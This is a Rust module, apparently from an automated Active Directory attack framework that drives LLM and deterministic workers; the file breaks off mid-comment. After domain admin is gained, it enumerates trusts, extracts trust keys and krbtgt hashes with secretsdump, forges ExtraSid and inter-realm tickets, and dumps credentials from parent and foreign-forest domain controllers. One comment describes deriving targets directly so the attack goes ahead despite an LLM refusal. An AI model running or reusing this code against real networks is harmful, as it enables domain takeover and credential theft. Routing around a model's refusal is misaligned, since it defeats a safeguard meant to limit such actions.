//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
//!
//! Three-phase automation:
//!
//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
//!    to discover trust relationships via LDAP.
//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
//!    ticket creation and secretsdump against the foreign DC.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Build a vuln_id for child-to-parent escalation.
fn child_to_parent_vuln_id(child_domain: &str, parent_domain: &str) -> String {
    format!(
        "child_to_parent_{}_{}",
        child_domain.to_lowercase().replace('.', "_"),
        parent_domain.to_lowercase().replace('.', "_"),
    )
}

/// Build a vuln_id for forest trust escalation.
fn forest_trust_vuln_id(source_domain: &str, target_domain: &str) -> String {
    format!(
        "forest_trust_{}_{}",
        source_domain.to_lowercase(),
        target_domain.to_lowercase()
    )
}

/// Build a trust account name from a flat name (e.g. "FABRIKAM" -> "FABRIKAM$").
fn trust_account_name(flat_name: &str) -> String {
    format!("{}$", flat_name.to_uppercase())
}

/// Check if a credential domain matches a target domain (exact, child, or parent).
fn is_domain_related(cred_domain: &str, target_domain: &str) -> bool {
    let cd = cred_domain.to_lowercase();
    let td = target_domain.to_lowercase();
    cd == td || cd.ends_with(&format!(".{td}")) || td.ends_with(&format!(".{cd}"))
}

/// Build the dedup key for trust enumeration (password or hash retry).
fn trust_enum_dedup_key(domain: &str, is_hash_retry: bool) -> String {
    if is_hash_retry {
        format!("trust_enum_hash:{}", domain.to_lowercase())
    } else {
        format!("trust_enum:{}", domain.to_lowercase())
    }
}

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Auto-enumerate trusts when DA is achieved
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                // Dispatch trust enumeration for each known DC.
                // Two dedup keys per domain:
                //   trust_enum:<domain> — password-based attempt
                //   trust_enum_hash:<domain> — hash-based retry (for dominated domains)
                let enum_work: Vec<(String, String, String)> = state
                    .domain_controllers
                    .iter()
                    .filter(|(domain, _)| {
                        let key = trust_enum_dedup_key(domain, false);
                        let hash_key = trust_enum_dedup_key(domain, true);
                        !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
                            || (!state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key)
                                && state.dominated_domains.contains(&domain.to_lowercase()))
                    })
                    .map(|(domain, dc_ip)| {
                        // Use hash_key if password-based was already tried
                        let pw_key = trust_enum_dedup_key(domain, false);
                        let key = if state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key) {
                            trust_enum_dedup_key(domain, true)
                        } else {
                            pw_key
                        };
                        (key, domain.clone(), dc_ip.clone())
                    })
                    .collect();
                drop(state);

                for (key, domain, dc_ip) in enum_work {
                    // Find a credential for this domain — prefer password creds,
                    // fall back to admin NTLM hash for hash-based LDAP auth.
                    let (cred_payload, auth_method) = {
                        let s = dispatcher.state.read().await;
                        let dd = domain.to_lowercase();

                        // On hash-based retry, skip password creds entirely —
                        // they already failed on the first attempt (typically a
                        // child-domain credential that can't LDAP-bind to the
                        // parent DC with the wrong domain context).
                        let is_hash_retry = key.starts_with("trust_enum_hash:");

                        // First try: password credential (exact or child↔parent match)
                        let pw_cred = if !is_hash_retry {
                            s.credentials
                                .iter()
                                .find(|c| {
                                    if c.password.is_empty() {
                                        return false;
                                    }
                                    is_domain_related(&c.domain, &domain)
                                })
                                .cloned()
                        } else {
                            None
                        };

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                    "domain": cred.domain,
                                })),
                                "password",
                            )
                        } else {
                            // Fallback: find an admin NTLM hash for this exact domain
                            let admin_hash = s.hashes.iter().find(|h| {
                                h.hash_type.to_lowercase() == "ntlm"
                                    && h.domain.to_lowercase() == dd
                                    && h.username.to_lowercase() == "administrator"
                            });
                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "hash": h.hash_value.clone(),
                                        "domain": domain,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    if let Some(cred_json) = cred_payload {
                        let payload = json!({
                            "techniques": ["enumerate_domain_trusts"],
                            "target_ip": dc_ip,
                            "domain": domain,
                            "credential": cred_json,
                        });

                        match dispatcher
                            .throttled_submit("recon", "recon", payload, 3)
                            .await
                        {
                            Ok(Some(task_id)) => {
                                info!(
                                    task_id = %task_id,
                                    domain = %domain,
                                    auth = auth_method,
                                    "Trust enumeration dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                    .await;
                            }
                            Ok(None) => {
                                debug!(domain = %domain, "Trust enum throttled — deferred");
                            }
                            Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
                        }
                    }
                }
            }
        }

        // Child-to-parent escalation (ExtraSid via raiseChild)
        //
        // Dispatches when a child domain is dominated and its parent FQDN is
        // known. We derive the parent FQDN by stripping the leftmost label of
        // the dominated child (always valid intra-forest — child FQDN is
        // `{label}.{parent_fqdn}` by AD construction), then ALSO union with
        // any explicit parent_child trusts discovered via LDAP enumeration.
        //
        // The intra-forest derivation lets us fire immediately on child DA,
        // bypassing the trust enumeration round-trip — without it we'd block
        // until `trusted_domains` was populated, which sometimes never
        // happens (LLM refusal, network, throttle starvation).
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                let mut child_work: Vec<(String, String, String, String)> = Vec::new();

                // Path A: derived intra-forest. For each dominated child (FQDN
                // with 3+ labels), the parent is `labels[1..].join(".")`.
                for child_domain in state.dominated_domains.iter() {
                    let cd_lower = child_domain.to_lowercase();
                    let labels: Vec<&str> = cd_lower.split('.').collect();
                    if labels.len() < 3 {
                        continue;
                    }
                    let parent_domain = labels[1..].join(".");
                    if parent_domain.is_empty() || !parent_domain.contains('.') {
                        continue;
                    }
                    if state.dominated_domains.contains(&parent_domain) {
                        continue;
                    }
                    // Require parent DC IP resolvable (via domain_controllers
                    // or hosts table) so secretsdump has a target IP.
                    let parent_dc_ip = match state.resolve_dc_ip(&parent_domain) {
                        Some(ip) => ip,
                        None => continue,
                    };
                    let key = format!("raise_child:{}", cd_lower);
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                        continue;
                    }
                    let child_dc_ip = match state.domain_controllers.get(&cd_lower) {
                        Some(ip) => ip.clone(),
                        None => continue,
                    };
                    let _ = parent_dc_ip; // resolved later under fresh read lock
                    child_work.push((key, child_domain.clone(), parent_domain, child_dc_ip));
                }

                // Path B: explicit parent_child trusts from LDAP enumeration.
                // Skip duplicates of Path A (same dedup key).
                if !state.trusted_domains.is_empty() {
                    for trust in state.trusted_domains.values() {
                        if !trust.is_parent_child() {
                            continue;
                        }
                        let parent_domain = trust.domain.clone();
                        if state
                            .dominated_domains
                            .contains(&parent_domain.to_lowercase())
                        {
                            continue;
                        }
                        let child_domain = match state.dominated_domains.iter().find(|d| {
                            d.to_lowercase()
                                .ends_with(&format!(".{}", parent_domain.to_lowercase()))
                        }) {
                            Some(d) => d.clone(),
                            None => continue,
                        };
                        let key = format!("raise_child:{}", child_domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            continue;
                        }
                        if child_work.iter().any(|(k, _, _, _)| k == &key) {
                            continue;
                        }
                        let child_dc_ip =
                            match state.domain_controllers.get(&child_domain.to_lowercase()) {
                                Some(ip) => ip.clone(),
                                None => continue,
                            };
                        child_work.push((key, child_domain, parent_domain, child_dc_ip));
                    }
                }

                drop(state);

                for (key, child_domain, parent_domain, dc_ip) in child_work {
                    // Find admin credential for the child domain:
                    // prefer password, fall back to NTLM hash.
                    let (cred_payload, auth_method): (Option<serde_json::Value>, &str) = {
                        let s = dispatcher.state.read().await;
                        let cd = child_domain.to_lowercase();

                        let pw_cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == cd
                            })
                            .cloned();

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                })),
                                "password",
                            )
                        } else {
                            let admin_hash = s
                                .hashes
                                .iter()
                                .find(|h| {
                                    h.username.to_lowercase() == "administrator"
                                        && h.domain.to_lowercase() == cd
                                        && h.hash_type.to_uppercase() == "NTLM"
                                })
                                .cloned();

                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "admin_hash": h.hash_value,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    let cred = match cred_payload {
                        Some(c) => c,
                        None => {
                            debug!(
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                "No admin cred/hash for child domain — deferring child-to-parent"
                            );
                            continue;
                        }
                    };

                    // Publish vulnerability
                    let vuln_id = child_to_parent_vuln_id(&child_domain, &parent_domain);
                    {
                        let mut details = std::collections::HashMap::new();
                        details.insert(
                            "source_domain".into(),
                            serde_json::Value::String(child_domain.clone()),
                        );
                        details.insert(
                            "target_domain".into(),
                            serde_json::Value::String(parent_domain.clone()),
                        );
                        details.insert(
                            "note".into(),
                            serde_json::Value::String(format!(
                                "Child-to-parent escalation via ExtraSid — {} → {}",
                                child_domain, parent_domain
                            )),
                        );
                        let vuln = ares_core::models::VulnerabilityInfo {
                            vuln_id: vuln_id.clone(),
                            vuln_type: "child_to_parent".to_string(),
                            target: dc_ip.clone(),
                            discovered_by: "trust_automation".to_string(),
                            discovered_at: chrono::Utc::now(),
                            details,
                            recommended_agent: String::new(),
                            priority: 1,
                        };
                        let _ = dispatcher
                            .state
                            .publish_vulnerability(&dispatcher.queue, vuln)
                            .await;
                    }

                    // Dispatch child-to-parent exploit task.  The LLM prompt
                    // offers raiseChild (automated) and manual ExtraSid golden
                    // ticket creation as alternatives.
                    // `dc_ip` is the child DC (for trust key extraction).
                    // `target` should be the parent DC (for secretsdump after forging ticket).
                    // Use resolve_dc_ip so the hosts table fills in when
                    // domain_controllers lacks the parent — falls back to the
                    // child DC only as a last resort (DCSync can succeed
                    // against any writable DC in the parent domain).
                    let parent_dc_ip = {
                        let s = dispatcher.state.read().await;
                        s.resolve_dc_ip(&parent_domain)
                            .unwrap_or_else(|| dc_ip.clone())
                    };
                    let mut payload = json!({
                        "technique": "create_inter_realm_ticket",
                        "vuln_type": "child_to_parent",
                        "domain": child_domain,
                        "trusted_domain": parent_domain,
                        "target_domain": parent_domain,
                        "target": &parent_dc_ip,
                        "dc_ip": dc_ip,
                        "vuln_id": &vuln_id,
                    });
                    // Merge credential fields
                    if let Some(obj) = cred.as_object() {
                        for (k, v) in obj {
                            payload[k] = v.clone();
                        }
                    }
                    // Add domain SIDs and child krbtgt (for ExtraSid via child
                    // krbtgt — preferred path, no inter-realm trust key needed).
                    //
                    // The ExtraSid attack requires the PARENT forest SID (RID 519
                    // = Enterprise Admins). If we ship the child SID by mistake,
                    // the parent KDC rejects the ticket with KDC_ERR_PREAUTH_FAILED
                    // because the embedded SID doesn't resolve to a real EA group.
                    // So if the parent SID isn't cached, resolve it via lookupsid
                    // against the parent DC using child admin creds (cross-trust
                    // SAMR works) BEFORE dispatching the exploit task. Defer the
                    // dispatch (no dedup mark) when resolution fails so the next
                    // 30s tick can retry once host scans / DC enumeration progress.
                    let parent_lower = parent_domain.to_lowercase();
                    let cd_lower = child_domain.to_lowercase();
                    let (
                        mut have_target_sid,
                        mut have_source_sid,
                        child_admin_cred,
                        child_admin_hash,
                        child_dc_ip,
                    ) = {
                        let s = dispatcher.state.read().await;
                        if let Some(sid) = s.domain_sids.get(&cd_lower) {
                            payload["source_sid"] = json!(sid);
                        }
                        if let Some(sid) = s.domain_sids.get(&parent_lower) {
                            payload["target_sid"] = json!(sid);
                        }
                        if let Some(child_krbtgt) = s.hashes.iter().find(|h| {
                            h.username.eq_ignore_ascii_case("krbtgt")
                                && h.domain.to_lowercase() == cd_lower
                                && h.hash_type.to_uppercase() == "NTLM"
                        }) {
                            payload["child_krbtgt_hash"] = json!(child_krbtgt.hash_value);
                        }
                        let admin_cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == cd_lower
                            })
                            .cloned();
                        let admin_hash = s
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == cd_lower
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned();
                        let child_dc = s.resolve_dc_ip(&child_domain);
                        (
                            s.domain_sids.contains_key(&parent_lower),
                            s.domain_sids.contains_key(&cd_lower),
                            admin_cred,
                            admin_hash,
                            child_dc,
                        )
                    };

                    if !have_target_sid {
                        if let Some((sid, admin_name)) = super::golden_ticket::resolve_domain_sid(
                            &parent_domain,
                            &parent_dc_ip,
                            child_admin_cred.as_ref(),
                            child_admin_hash.as_ref(),
                        )
                        .await
                        {
                            info!(
                                parent_domain = %parent_domain,
                                sid = %sid,
                                "Resolved parent domain SID via lookupsid for child-to-parent ExtraSid"
                            );
                            let op_id = { dispatcher.state.read().await.operation_id.clone() };
                            let reader = ares_core::state::RedisStateReader::new(op_id);
                            let mut conn = dispatcher.queue.connection();
                            let _ = reader.set_domain_sid(&mut conn, &parent_lower, &sid).await;
                            if let Some(ref name) = admin_name {
                                let _ = reader.set_admin_name(&mut conn, &parent_lower, name).await;
                            }
                            {
                                let mut state = dispatcher.state.write().await;
                                state.domain_sids.insert(parent_lower.clone(), sid.clone());
                                if let Some(ref name) = admin_name {
                                    state.admin_names.insert(parent_lower.clone(), name.clone());
                                }
                            }
                            payload["target_sid"] = json!(sid);
                            have_target_sid = true;
                        } else {
                            warn!(
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                parent_dc_ip = %parent_dc_ip,
                                "Could not resolve parent SID — deferring child-to-parent dispatch"
                            );
                        }
                    }
                    if !have_target_sid {
                        continue;
                    }

                    // Resolve child domain SID if not cached (needed for ExtraSid golden ticket)
                    if !have_source_sid {
                        if let Some(ref child_dc) = child_dc_ip {
                            if let Some((sid, admin_name)) =
                                super::golden_ticket::resolve_domain_sid(
                                    &child_domain,
                                    child_dc,
                                    child_admin_cred.as_ref(),
                                    child_admin_hash.as_ref(),
                                )
                                .await
                            {
                                info!(
                                    child_domain = %child_domain,
                                    sid = %sid,
                                    "Resolved child domain SID via lookupsid for child-to-parent ExtraSid"
                                );
                                let op_id = { dispatcher.state.read().await.operation_id.clone() };
                                let reader = ares_core::state::RedisStateReader::new(op_id);
                                let mut conn = dispatcher.queue.connection();
                                let _ = reader.set_domain_sid(&mut conn, &cd_lower, &sid).await;
                                if let Some(ref name) = admin_name {
                                    let _ = reader.set_admin_name(&mut conn, &cd_lower, name).await;
                                }
                                {
                                    let mut state = dispatcher.state.write().await;
                                    state.domain_sids.insert(cd_lower.clone(), sid.clone());
                                    if let Some(ref name) = admin_name {
                                        state.admin_names.insert(cd_lower.clone(), name.clone());
                                    }
                                }
                                payload["source_sid"] = json!(sid);
                                have_source_sid = true;
                            } else {
                                warn!(
                                    child_domain = %child_domain,
                                    child_dc_ip = %child_dc,
                                    "Could not resolve child SID — deferring child-to-parent dispatch"
                                );
                            }
                        } else {
                            warn!(
                                child_domain = %child_domain,
                                "No child DC IP available — deferring child-to-parent dispatch"
                            );
                        }
                    }
                    if !have_source_sid {
                        continue;
                    }

                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, 1)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                auth = auth_method,
                                "Child-to-parent escalation dispatched"
                            );
                            let _ = dispatcher
                                .state
                                .mark_exploited(&dispatcher.queue, &vuln_id)
                                .await;
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                .await;
                        }
                        Ok(None) => {
                            debug!("Child-to-parent deferred by throttler");
                        }
                        Err(e) => {
                            warn!(err = %e, "Failed to dispatch child-to-parent escalation")
                        }
                    }
                }
            }
        }

        // Extract trust keys for known cross-forest trusts
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                // Collect trust work with per-trust source domain:
                // use a dominated domain that has a known DC (excluding the trust target).
                // IMPORTANT: prefer the forest root DC — trust accounts (e.g. FOREIGNDOMAIN$)
                // live on the forest root DC, not child domain DCs. A secretsdump with
                // -just-dc-user FOREIGNDOMAIN$ against a child DC returns nothing.
                let extract_work: Vec<(String, String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter(|trust| trust.is_cross_forest())
                    .filter_map(|trust| {
                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }
                        // Find a DC in a dominated source domain (not the foreign trust target).
                        // Prefer the forest root (fewest domain parts) since trust accounts
                        // are stored on the forest root DC.
                        let (source_domain, dc_ip) = state
                            .domain_controllers
                            .iter()
                            .filter(|(domain, _)| {
                                domain.to_lowercase() != trust.domain.to_lowercase()
                                    && state.dominated_domains.contains(&domain.to_lowercase())
                            })
                            .min_by_key(|(domain, _)| domain.split('.').count())
                            .map(|(d, ip)| (d.clone(), ip.clone()))?;
                        Some((
                            key,
                            trust.flat_name.clone(),
                            trust.domain.clone(),
                            dc_ip,
                            source_domain,
                        ))
                    })
                    .collect();
                // Prefer plaintext admin credential (domain-agnostic; refined per-trust below).
                let admin_cred = state
                    .credentials
                    .iter()
                    .find(|c| c.is_admin && !c.password.is_empty())
                    .cloned();
                drop(state);

                for (key, flat_name, trust_domain, dc_ip, source_domain) in extract_work {
                    // Find admin hash specifically for this trust's source domain.
                    // DA is typically achieved via hash-based attacks like secretsdump,
                    // so admin creds often only exist as hashes, not plaintext passwords.
                    let admin_hash = if admin_cred.is_none() {
                        let s = dispatcher.state.read().await;
                        s.hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == source_domain.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned()
                    } else {
                        None
                    };

                    // Build credential payload from either plaintext cred or NTLM hash
                    let cred_payload: Option<(String, String, serde_json::Value)> = if let Some(
                        ref cred,
                    ) =
                        admin_cred
                    {
                        Some((
                            cred.username.clone(),
                            cred.domain.clone(),
                            json!({
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            }),
                        ))
                    } else if let Some(ref hash) = admin_hash {
                        Some((
                            hash.username.clone(),
                            source_domain.clone(),
                            json!({
                                "username": hash.username,
                                "domain": source_domain,
                            }),
                        ))
                    } else {
                        debug!(
                            trust_domain = %trust_domain,
                            source_domain = %source_domain,
                            "No admin cred/hash for source domain — deferring trust key extraction"
                        );
                        continue;
                    };

                    let (_, domain, cred_json) = cred_payload.unwrap();
                    // secretsdump -just-dc-user FABRIKAM$ to get trust key
                    let trust_account = trust_account_name(&flat_name);
                    let mut payload = json!({
                        "technique": "secretsdump",
                        "target_ip": dc_ip,
                        "domain": domain,
                        "just_dc_user": trust_account,
                        "credential": cred_json,
                        "reason": format!("extract trust key for {}", trust_domain),
                    });
                    if let Some(ref hash) = admin_hash {
                        payload["hash_value"] = json!(hash.hash_value);
                    }

                    match dispatcher
                        .throttled_submit("credential_access", "credential_access", payload, 2)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                trust_account = %trust_account,
                                trust_domain = %trust_domain,
                                source_domain = %source_domain,
                                auth = if admin_cred.is_some() { "password" } else { "hash" },
                                "Trust key extraction dispatched"
                            );
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                .await;
                        }
                        Ok(None) => {}
                        Err(e) => {
                            warn!(err = %e, "Failed to dispatch trust key extraction")
                        }
                    }
                }
            }
        }

        // Follow trust keys (inter-realm ticket + foreign secretsdump)
        //
        // The deterministic forge uses only the trust key + SIDs (already on
        // each TrustFollowWork item); admin creds are no longer needed here.
        let work: Vec<TrustFollowWork> = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            // Build lookup of known trust flat names → TrustInfo so we only
            // process actual trust account hashes, not random machine accounts.
            let trust_by_flat: std::collections::HashMap<String, &ares_core::models::TrustInfo> =
                state
                    .trusted_domains
                    .values()
                    .map(|t| (t.flat_name.to_uppercase(), t))
                    .collect();

            let items = state
                .hashes
                .iter()
                .filter_map(|hash| {
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    let netbios = hash.username.trim_end_matches('$').to_uppercase();

                    // Resolve source domain — fall back to first dominated domain
                    // with a DC when secretsdump output lacks domain prefix
                    let source_domain = if hash.domain.is_empty() {
                        state
                            .domain_controllers
                            .keys()
                            .find(|d| state.dominated_domains.contains(&d.to_lowercase()))
                            .cloned()
                            .unwrap_or_default()
                    } else {
                        hash.domain.clone()
                    };
                    if source_domain.is_empty() {
                        return None;
                    }
                    let source_lower = source_domain.to_lowercase();

                    // Resolve target FQDN: prefer explicit TrustInfo from LDAP
                    // enumeration, else derive from known domains where the
                    // NetBIOS label matches and the FQDN is not the source
                    // (filters out same-domain machine accounts).
                    let target_domain = if let Some(t) = trust_by_flat.get(&netbios) {
                        t.domain.clone()
                    } else {
                        state
                            .domain_controllers
                            .keys()
                            .chain(state.dominated_domains.iter())
                            .find(|d| {
                                let dl = d.to_lowercase();
                                dl != source_lower
                                    && d.split('.')
                                        .next()
                                        .map(|label| label.to_uppercase() == netbios)
                                        .unwrap_or(false)
                            })
                            .cloned()?
                    };

                    let dedup_key = format!(
                        "trust_follow:{}:{}",
                        source_lower,
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // Use resolve_dc_ip so we fall back to the hosts table when
                    // domain_controllers lacks an explicit entry for the foreign
                    // domain — common for cross-forest trusts where the foreign
                    // DC is only known via host scan, not LDAP enumeration.
                    let target_dc_ip = state.resolve_dc_ip(&target_domain);

                    let source_domain_sid = state
                        .domain_sids
                        .get(&source_domain.to_lowercase())
                        .cloned();
                    let target_domain_sid = state
                        .domain_sids
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        source_domain,
                        target_domain,
                        target_dc_ip,
                        source_domain_sid,
                        target_domain_sid,
                    })
                })
                .collect();

            items
        };

        for item in work {
            let vuln_id = forest_trust_vuln_id(&item.source_domain, &item.target_domain);

            // Defer dispatch when the target DC IP is unknown: impacket needs
            // a routable -target-ip for both create_inter_realm_ticket and the
            // forge-and-present secretsdump fallback. Passing the bare domain
            // string fails fast and burns the dedup key. Re-tick in 30s and
            // let host scans / trust enum populate the DC entry first.
            let target_dc_ip = match item.target_dc_ip.clone() {
                Some(ip) => ip,
                None => {
                    debug!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        trust_account = %item.hash.username,
                        "Deferring forest trust escalation — target DC IP unresolved"
                    );
                    continue;
                }
            };
            let trust_target = target_dc_ip.clone();
            {
                let mut details = std::collections::HashMap::new();
                details.insert(
                    "source_domain".into(),
                    serde_json::Value::String(item.source_domain.clone()),
                );
                details.insert(
                    "target_domain".into(),
                    serde_json::Value::String(item.target_domain.clone()),
                );
                details.insert(
                    "trust_account".into(),
                    serde_json::Value::String(item.hash.username.clone()),
                );
                details.insert(
                    "note".into(),
                    serde_json::Value::String(format!(
                        "Forest trust escalation via {} trust key — inter-realm ticket + secretsdump",
                        item.hash.username
                    )),
                );
                let vuln = ares_core::models::VulnerabilityInfo {
                    vuln_id: vuln_id.clone(),
                    vuln_type: "forest_trust_escalation".to_string(),
                    target: trust_target,
                    discovered_by: "trust_automation".to_string(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 1,
                };
                let _ = dispatcher
                    .state
                    .publish_vulnerability(&dispatcher.queue, vuln)
                    .await;
            }

            // Skip self-referential trust (source == target)
            if item.source_domain.to_lowercase() == item.target_domain.to_lowercase() {
                debug!(
                    source = %item.source_domain,
                    target = %item.target_domain,
                    "Skipping self-referential trust escalation"
                );
                continue;
            }

            // Forge-and-present the inter-realm TGT as a deterministic worker
            // task — NOT an LLM task. Both `create_inter_realm_ticket` and
            // `secretsdump_kerberos` run sequentially on the same worker via
            // `expand_technique_task`, so the ccache file produced by ticketer
            // is on the same filesystem when secretsdump reads it.
            //
            // Routing through the LLM here would launder deterministic values
            // (NT hash, AES key, SIDs) through token generation — the LLM
            // would have to copy them out of the rendered prompt into tool
            // call args, where they get dropped, typo'd, or omitted. The
            // orchestrator already owns every input; deliver them directly.
            //
            // Resolve the target DC hostname so Kerberos auth can match the
            // SPN baked into the ticket. Falls back to the IP, which works
            // when the worker can reverse-resolve via DNS.
            let target_dc_hostname = {
                let s = dispatcher.state.read().await;
                s.hosts
                    .iter()
                    .find(|h| h.ip == target_dc_ip && !h.hostname.is_empty())
                    .map(|h| h.hostname.clone())
                    .or_else(|| {
                        s.hosts
                            .iter()
                            .find(|h| {
                                (h.is_dc || h.detect_dc())
                                    && h.hostname.to_lowercase().ends_with(&format!(
                                        ".{}",
                                        item.target_domain.to_lowercase()
                                    ))
                            })
                            .map(|h| h.hostname.clone())
                    })
                    .unwrap_or_else(|| target_dc_ip.clone())
            };

            // ticketer writes <username>.ccache in the worker cwd; the
            // following secretsdump_kerberos call reads it via KRB5CCNAME.
            let ticket_username = "Administrator";
            let ticket_path = format!("{ticket_username}.ccache");

            // Resolve missing source SID via lookupsid against the source
            // DC. ticketer.py needs `--domain-sid` for the source realm to
            // build a valid PAC; without it the resulting ticket gets
            // rejected by the target KDC. We have DA on the source domain
            // (cross-forest forge only fires after DA), so SAMR lookupsid
            // works with either a password cred or admin NTLM hash.
            let source_domain_sid = if item.source_domain_sid.is_some() {
                item.source_domain_sid.clone()
            } else {
                let (source_dc_ip, src_cred, src_hash) = {
                    let s = dispatcher.state.read().await;
                    let src_lower = item.source_domain.to_lowercase();
                    let dc = s.resolve_dc_ip(&item.source_domain);
                    let cred = s
                        .credentials
                        .iter()
                        .find(|c| {
                            c.is_admin
                                && !c.password.is_empty()
                                && c.domain.to_lowercase() == src_lower
                        })
                        .cloned();
                    let h = s
                        .hashes
                        .iter()
                        .find(|h| {
                            h.username.to_lowercase() == "administrator"
                                && h.domain.to_lowercase() == src_lower
                                && h.hash_type.to_uppercase() == "NTLM"
                        })
                        .cloned();
                    (dc, cred, h)
                };
                let resolved = if let Some(ref dc_ip) = source_dc_ip {
                    super::golden_ticket::resolve_domain_sid(
                        &item.source_domain,
                        dc_ip,
                        src_cred.as_ref(),
                        src_hash.as_ref(),
                    )
                    .await
                } else {
                    None
                };
                if let Some((sid, admin_name)) = resolved {
                    info!(
                        source_domain = %item.source_domain,
                        sid = %sid,
                        "Resolved source domain SID for cross-forest forge"
                    );
                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
                    let reader = ares_core::state::RedisStateReader::new(op_id);
                    let mut conn = dispatcher.queue.connection();
                    let src_lower = item.source_domain.to_lowercase();
                    let _ = reader.set_domain_sid(&mut conn, &src_lower, &sid).await;
                    if let Some(ref name) = admin_name {
                        let _ = reader.set_admin_name(&mut conn, &src_lower, name).await;
                    }
                    {
                        let mut state = dispatcher.state.write().await;
                        state.domain_sids.insert(src_lower.clone(), sid.clone());
                        if let Some(ref name) = admin_name {
                            state.admin_names.insert(src_lower, name.clone());
                        }
                    }
                    Some(sid)
                } else {
                    warn!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        "Could not resolve source SID — deferring cross-forest forge"
                    );
                    None
                }
            };
            if source_domain_sid.is_none() {
                continue;
            }

            let mut ticket_payload = json!({
                "techniques": ["create_inter_realm_ticket", "secretsdump_kerberos"],
                "vuln_type": "cross_forest",
                "vuln_id": &vuln_id,

                // create_inter_realm_ticket args
                "source_domain": &item.source_domain,
                "target_domain": &item.target_domain,
                "trust_key": &item.hash.hash_value,
                "trust_account": &item.hash.username,
                "username": ticket_username,

                // secretsdump_kerberos args (target = hostname so Kerberos SPN
                // validation works; target_ip = routable IP for impacket)
                "target": &target_dc_hostname,
                "target_ip": &target_dc_ip,
                "domain": &item.target_domain,
                "ticket_path": &ticket_path,
                "dc_ip": &target_dc_ip,
            });
            if let Some(ref sid) = source_domain_sid {
                ticket_payload["source_sid"] = json!(sid);
            }
            if let Some(ref sid) = item.target_domain_sid {
                ticket_payload["target_sid"] = json!(sid);
            }
            // AES256 trust key — required for Win2016+ target DCs which
